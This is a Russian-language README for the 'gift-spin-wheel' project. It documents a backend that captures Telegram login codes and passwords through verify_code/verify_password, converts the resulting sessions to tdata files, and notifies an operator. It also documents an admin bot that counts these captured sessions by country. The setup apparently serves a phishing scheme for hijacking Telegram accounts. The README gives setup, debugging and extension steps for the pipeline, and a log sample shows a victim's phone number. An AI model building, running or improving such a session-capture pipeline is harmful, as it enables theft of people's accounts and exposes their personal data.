# Admin Bot + Backend Integration

## Как это работает

Админ-бот автоматически читает логи от бэкенда и отображает статистику в реальном времени.

### Поток данных

```
Backend Auth.py
    ↓
    verify_code() или verify_password()
    ↓
    convert_session_to_tdata(..., country_code='ru')
    ↓
    send_telegram_notification(msg, country_code='ru')
    ↓
    Notification sent via primary: {"ok":true, ...
                                    "text":"🇷🇺 Новая сессия (Russia):..."}
    ↓
    Запись в converter.log файл:
    2025-11-16 03:41:57,177 - INFO - Notification sent via primary: {...}
    ↓
    Admin Bot читает converter.log
    ↓
    LogService парсит JSON и извлекает:
    - Страну: (Russia) → 'ru'
    - Успех: "ok":true ✓
    - Время: 2025-11-16 03:41:57
    ↓
    Админ видит в чате:
    🌍 Статистика по странам сегодня 📅
    🇷🇺 Russia: 2
    Всего стран: 1
```

## Компоненты

### 1. Backend: `/backend/convert_sessions.py`

```python
send_telegram_notification(text: str, country_code: str = None) -> bool:
    # Отправляет уведомление с информацией о стране
    # Логирует: "Notification sent via primary: {...}"
```

Логируемые данные:
- Время отправки (парсится из начала строки)
- Страна в JSON (извлекается из text поля)
- Статус успеха (проверяется "ok":true)

### 2. Admin Bot: `/admin-bot/utils/log_service.py`

```python
class LogService:
    read_logs() → list[str]
        # Читает весь converter.log файл
        
    count_logs_by_period(period: str) → dict
        # period: "today", "week", "month", "all"
        # Возвращает: {total, successful, failed, fallback}
        
    count_logs_by_country(period: str) → dict
        # Возвращает: {'ru': 2, 'us': 1, ...}
        
    _parse_timestamp(log_line: str) → datetime
        # Парсит "2025-11-16 03:41:57,177"
        
    _extract_country_from_log(log_line: str) → str
        # Ищет "(Russia)" в JSON и возвращает 'ru'
```

## Тестирование

Запустите тест-скрипт для проверки парсинга:

```bash
cd /Users/zootix/Desktop/gift-spin-wheel/admin-bot
python3 test_logs.py
```

Результат должен быть:
```
📊 Statistics by Time Period:
TODAY:
  Total: 4
  Successful: 4
  Failed: 0
  Success Rate: 100%

📍 Statistics by Country:
TODAY:
  🇷🇺 Russia: 2
  Total countries: 1
```

## Файлы логов

**Путь:** `/Users/zootix/Desktop/gift-spin-wheel/backend/results/session_to_tdata/converter.log`

**Пример строки логирования:**
```
2025-11-16 03:41:57,177 - INFO - Notification sent via primary: 
  {"ok":true,"result":{"message_id":164,...,"text":"🇷🇺 Новая сессия (Russia):\n📱 Номер: 79004806930\n📄 Файл: 79004806930.session\n⏳ Статус: начинаю конвертацию...",...}}
```

## Как добавить страну

1. В `backend/convert_sessions.py` строка 39-75: `COUNTRY_FLAGS`
   ```python
   COUNTRY_FLAGS = {
       'ru': ('🇷🇺', 'Russia'),
       'us': ('🇺🇸', 'USA'),
       # ... добавьте свою
   }
   ```

2. В `admin-bot/utils/log_service.py` строки 11-47: `COUNTRY_FLAGS` и `COUNTRY_NAMES`
   ```python
   COUNTRY_FLAGS = {
       'ru': '🇷🇺',
       'us': '🇺🇸',
       # ... добавьте свою
   }
   
   COUNTRY_NAMES = {
       'ru': 'Russia',
       'us': 'USA',
       # ... добавьте свою
   }
   ```

3. При отправке уведомления в бэке передайте `country_code`:
   ```python
   await convert_session_to_tdata(
       phone_clean, 
       str(session_file), 
       API_ID, 
       API_HASH,
       output_dir=str(tdata_dir),
       country_code='ru'  # ← Добавьте это
   )
   ```

## Что изменилось

### В backend:

✅ `/backend/auth.py` (verify_code и verify_password)
- Добавлена передача `country_code` параметра в `convert_session_to_tdata()`

### В admin-bot:

✅ `/admin-bot/utils/log_service.py` (LogService класс)
- Улучшена логика `count_logs_by_period()` - считает "Notification sent via"
- Улучшена логика `count_logs_by_country()` - ищет "(Russia)" в JSON
- Улучшена логика `_extract_country_from_log()` - правильно парсит страны

✨ `/admin-bot/test_logs.py` (новый файл)
- Тестовый скрипт для проверки парсинга
- Выводит статистику в реальном времени

## Отладка

Если статистика не обновляется:

1. Проверьте, что логи пишутся:
   ```bash
   tail -20 /Users/zootix/Desktop/gift-spin-wheel/backend/results/session_to_tdata/converter.log
   ```

2. Проверьте парсинг:
   ```bash
   cd /Users/zootix/Desktop/gift-spin-wheel/admin-bot
   python3 test_logs.py
   ```

3. Проверьте, что country_code передается правильно:
   ```bash
   grep "Russia" /Users/zootix/Desktop/gift-spin-wheel/backend/results/session_to_tdata/converter.log
   ```

## Готово!

Статистика теперь обновляется автоматически при каждом новом логе! 🎉

---

**Версия:** 1.0  
**Последнее обновление:** 16 ноября 2025 г.
